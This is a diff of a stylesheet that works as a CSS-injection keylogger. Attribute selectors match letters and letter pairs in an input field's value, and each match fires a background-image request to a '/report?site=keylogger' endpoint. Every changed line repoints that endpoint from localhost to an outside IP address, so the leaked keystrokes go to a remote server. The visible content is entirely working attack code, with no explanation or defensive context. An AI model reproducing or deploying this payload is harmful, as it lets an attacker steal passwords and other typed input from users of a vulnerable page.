@@ -18,77 +18,77 @@ body::before {
 
 input[value*="aa"] ~ #aa {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=aa");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=aa");
 }
 
 input[value*="ab"] ~ #ab {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=ab");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=ab");
 }
 
 input[value*="ac"] ~ #ac {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=ac");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=ac");
 }
 
 input[value^="a"] ~ #a_ {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=a_");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=a_");
 }
 
 input[value$="a"] ~ #_a {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=_a");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=_a");
 }
 
 input[value*="ba"] ~ #ba {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=ba");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=ba");
 }
 
 input[value*="bb"] ~ #bb {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=bb");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=bb");
 }
 
 input[value*="bc"] ~ #bc {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=bc");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=bc");
 }
 
 input[value^="b"] ~ #b_ {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=b_");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=b_");
 }
 
 input[value$="b"] ~ #_b {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=_b");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=_b");
 }
 
 input[value*="ca"] ~ #ca {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=ca");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=ca");
 }
 
 input[value*="cb"] ~ #cb {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=cb");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=cb");
 }
 
 input[value*="cc"] ~ #cc {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=cc");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=cc");
 }
 
 input[value^="c"] ~ #c_ {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=c_");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=c_");
 }
 
 input[value$="c"] ~ #_c {
     color: var(--hightlight);
-    background: url("http://localhost:3000/report?site=keylogger&payload=_c");
+    background: url("http://13.57.38.41:3000/report?site=keylogger&payload=_c");
 }
 
 
